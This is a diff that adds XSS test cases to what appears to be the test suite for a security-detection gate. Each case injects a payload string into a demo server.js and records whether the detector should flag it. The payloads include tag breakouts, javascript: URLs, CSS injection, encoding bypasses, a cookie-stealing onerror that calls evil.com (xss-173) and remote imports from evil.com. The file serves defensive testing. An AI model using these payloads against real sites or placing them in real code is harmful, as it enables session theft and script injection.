+    "description": "XSS-12: textarea fake closing mXSS",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `</textarea><script>alert(1)</script><textarea>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Breaking out of textarea context"
+  },
+  {
+    "id": "xss-141",
+    "requiresDocker": false,
+    "description": "XSS-12: title tag mXSS breakout",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `</title><script>alert(1)</script><title>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Breaking out of title element context"
+  },
+  {
+    "id": "xss-142",
+    "requiresDocker": false,
+    "description": "XSS-12: math namespace confusion mXSS",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<math><mtext><table><tr><td><style><math><mtext><img src=x onerror=alert(1)></mtext></math></style></td></tr></table></mtext></math>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Deep namespace confusion causing parser mutation"
+  },
+  {
+    "id": "xss-143",
+    "requiresDocker": false,
+    "description": "XSS-12: svg namespace confusion mXSS",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<svg><style><img src=x onerror=alert(1)></style></svg>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "SVG style element parsed differently than HTML style"
+  },
+  {
+    "id": "xss-144",
+    "requiresDocker": false,
+    "description": "XSS-12: select mXSS with img injection",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<select><option><img src=x onerror=alert(1)></option></select>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Select element parser removes option wrapper, exposing img"
+  },
+  {
+    "id": "xss-145",
+    "requiresDocker": false,
+    "description": "XSS-12 clean: noscript with safe message",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"<noscript><p>Please enable JavaScript</p></noscript>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Noscript with safe paragraph text content"
+  },
+  {
+    "id": "xss-146",
+    "requiresDocker": false,
+    "description": "XSS-12 clean: style tag with safe CSS",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const el = \"<style>body { background: white; }</style>\";\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "no_findings"
+      }
+    ],
+    "expectedSuccess": true,
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Style tag with safe CSS properties only"
+  },
+  {
+    "id": "xss-147",
+    "requiresDocker": false,
+    "description": "XSS-12 grounding: fabricated noscript XSS in /about page",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "html",
+        "selector": "noscript img[onerror]",
+        "expected": "exists"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "No noscript with img onerror exists in any route"
+  },
+  {
+    "id": "xss-148",
+    "requiresDocker": false,
+    "description": "XSS-12 grounding: fabricated title breakout in demo-app",
+    "edits": [],
+    "predicates": [
+      {
+        "type": "content",
+        "file": "server.js",
+        "pattern": "</title><script>"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "grounding",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "No title breakout pattern exists in server.js"
+  },
+  {
+    "id": "xss-149",
+    "requiresDocker": false,
+    "description": "XSS-08: stored payload in URL parameter reflected in page",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const name = req.url.split('name=')[1] || 'Guest';\n    res.end('<html><body>Hello ' + name + '</body></html>');\n    return;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "URL parameter directly concatenated into HTML response"
+  },
+  {
+    "id": "xss-150",
+    "requiresDocker": false,
+    "description": "XSS-08: stored XSS via JSON.stringify without escaping in HTML",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const data = { comment: '<img src=x onerror=alert(1)>' };\n    res.end('<html><body><script>var d = ' + JSON.stringify(data) + '</script></body></html>');\n    return;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "stored_xss",
+      "XSS-08"
+    ],
+    "rationale": "JSON.stringify output in script context without escaping"
+  },
+  {
+    "id": "xss-151",
+    "requiresDocker": false,
+    "description": "XSS-09: object data attribute with external HTML",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<object data=\"https://evil.com/xss.html\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "Object element loading external HTML page"
+  },
+  {
+    "id": "xss-152",
+    "requiresDocker": false,
+    "description": "XSS-09: script tag with type=\"module\" and external import",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script type=\"module\">import(\"https://evil.com/payload.mjs\")</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "ES module dynamic import from external domain"
+  },
+  {
+    "id": "xss-153",
+    "requiresDocker": false,
+    "description": "XSS-10: Handlebars triple-stash unescaped output",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: Handlebars.compile(\"{{{userInput}}}\")(context)\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "Handlebars triple-stash outputs raw HTML (no escaping)"
+  },
+  {
+    "id": "xss-154",
+    "requiresDocker": false,
+    "description": "XSS-10: EJS unescaped output tag",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "// DOM XSS sink: ejs.render(\"<%- userInput %>\", { userInput })\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "framework_specific",
+      "XSS-10"
+    ],
+    "rationale": "EJS <%- %> tag outputs raw unescaped HTML"
+  },
+  {
+    "id": "xss-155",
+    "requiresDocker": false,
+    "description": "XSS-12: xmp tag breakout",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `</xmp><script>alert(1)</script><xmp>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Breaking out of xmp element context"
+  },
+  {
+    "id": "xss-156",
+    "requiresDocker": false,
+    "description": "XSS-12: iframe srcdoc with script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "mutation_xss",
+      "XSS-12"
+    ],
+    "rationale": "Iframe srcdoc with inline script (bypasses src restrictions)"
+  },
+  {
+    "id": "xss-157",
+    "requiresDocker": false,
+    "description": "CSS injection: style background javascript URL",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div style=\"background:url(javascript:alert(1))\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "CSS background-image with javascript: protocol"
+  },
+  {
+    "id": "xss-158",
+    "requiresDocker": false,
+    "description": "CSS injection: style expression(alert)",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div style=\"width: expression(alert(1))\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "CSS expression() for code execution (IE-specific)"
+  },
+  {
+    "id": "xss-159",
+    "requiresDocker": false,
+    "description": "CSS injection: -moz-binding XBL vector",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div style=\"-moz-binding:url(https://evil.com/xss.xml#xss)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Mozilla XBL binding for arbitrary code execution"
+  },
+  {
+    "id": "xss-160",
+    "requiresDocker": false,
+    "description": "CSS injection: behavior HTC file",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div style=\"behavior: url(xss.htc)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "IE behavior property loading HTC component"
+  },
+  {
+    "id": "xss-161",
+    "requiresDocker": false,
+    "description": "CSS injection: @import from external domain",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<style>@import url(\"https://evil.com/steal.css\");</style>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "csp_bypass",
+      "XSS-09"
+    ],
+    "rationale": "CSS @import from external domain for exfiltration"
+  },
+  {
+    "id": "xss-162",
+    "requiresDocker": false,
+    "description": "CSS injection: unicode escaped expression",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<div style=\"\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006f\\006e(alert(1))\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "CSS unicode escapes spelling \"expression\""
+  },
+  {
+    "id": "xss-163",
+    "requiresDocker": false,
+    "description": "Protocol: img dynsrc javascript attribute",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img dynsrc=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Legacy IE dynsrc attribute with javascript: protocol"
+  },
+  {
+    "id": "xss-164",
+    "requiresDocker": false,
+    "description": "Protocol: img lowsrc javascript attribute",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img lowsrc=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Legacy lowsrc attribute with javascript: protocol"
+  },
+  {
+    "id": "xss-165",
+    "requiresDocker": false,
+    "description": "Protocol: bgsound src javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<bgsound src=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Deprecated bgsound element with javascript: src"
+  },
+  {
+    "id": "xss-166",
+    "requiresDocker": false,
+    "description": "Protocol: link rel stylesheet javascript href",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<link rel=\"stylesheet\" href=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Stylesheet link with javascript: protocol"
+  },
+  {
+    "id": "xss-167",
+    "requiresDocker": false,
+    "description": "Protocol: table background javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<table background=\"javascript:alert(1)\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Legacy table background attribute with javascript:"
+  },
+  {
+    "id": "xss-168",
+    "requiresDocker": false,
+    "description": "Protocol: button formaction javascript",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<button formaction=\"javascript:alert(1)\">click</button>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Button formaction with javascript: protocol"
+  },
+  {
+    "id": "xss-169",
+    "requiresDocker": false,
+    "description": "Protocol: input type image onerror",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<input type=\"image\" src=x onerror=alert(1)>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Image input type with onerror handler"
+  },
+  {
+    "id": "xss-170",
+    "requiresDocker": false,
+    "description": "Protocol: meta refresh data URI with script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>alert(1)</script>\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "protocol_handlers",
+      "XSS-04"
+    ],
+    "rationale": "Meta refresh with data: URI containing script"
+  },
+  {
+    "id": "xss-171",
+    "requiresDocker": false,
+    "description": "Attribute: input value breakout with script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `\"><script>alert(1)</script><input value=\"`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Breaking out of attribute value to inject script"
+  },
+  {
+    "id": "xss-172",
+    "requiresDocker": false,
+    "description": "Attribute: a onmouseover handler",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a onmouseover=alert(1)>hover link</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Anchor tag with onmouseover event handler"
+  },
+  {
+    "id": "xss-173",
+    "requiresDocker": false,
+    "description": "Attribute: img onerror cookie theft",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=\"this.src='https://evil.com/steal?'+document.cookie\">`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Onerror handler stealing cookies via img src redirect"
+  },
+  {
+    "id": "xss-174",
+    "requiresDocker": false,
+    "description": "Attribute: img onerror with backtick syntax",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<img src=x onerror=\\`alert(1)\\`>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "attribute_injection",
+      "XSS-02"
+    ],
+    "rationale": "Backtick-quoted event handler value"
+  },
+  {
+    "id": "xss-175",
+    "requiresDocker": false,
+    "description": "Encoding: javascript with tab after colon",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"javascript:\talert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Tab character between javascript: and function call"
+  },
+  {
+    "id": "xss-176",
+    "requiresDocker": false,
+    "description": "Encoding: javascript with encoded newline",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<a href=\"java&#x0a;script:alert(1)\">click</a>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Newline entity inside javascript: protocol"
+  },
+  {
+    "id": "xss-177",
+    "requiresDocker": false,
+    "description": "Encoding: CDATA section with script",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<![CDATA[<script>alert(1)</script>]]>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "CDATA section containing script tag"
+  },
+  {
+    "id": "xss-178",
+    "requiresDocker": false,
+    "description": "Encoding: half-open HTML comment bypass",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>alert(1)<!--</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Unclosed HTML comment breaking script parsing"
+  },
+  {
+    "id": "xss-179",
+    "requiresDocker": false,
+    "description": "Encoding: overlong UTF-8 sequence",
+    "edits": [
+      {
+        "file": "server.js",
+        "search": "res.end(JSON.stringify({ status: 'ok' }));",
+        "replace": "const output = `<script>al\\xC0\\xAErt(1)</script>`;\n    res.end(JSON.stringify({ status: 'ok' }));"
+      }
+    ],
+    "predicates": [
+      {
+        "type": "security",
+        "securityCheck": "xss_detection",
+        "expected": "has_findings"
+      }
+    ],
+    "expectedSuccess": false,
+    "expectedFailedGate": "security",
+    "tags": [
+      "security",
+      "encoding_bypass",
+      "XSS-05"
+    ],
+    "rationale": "Overlong UTF-8 encoding to bypass filters"
+  }
+]
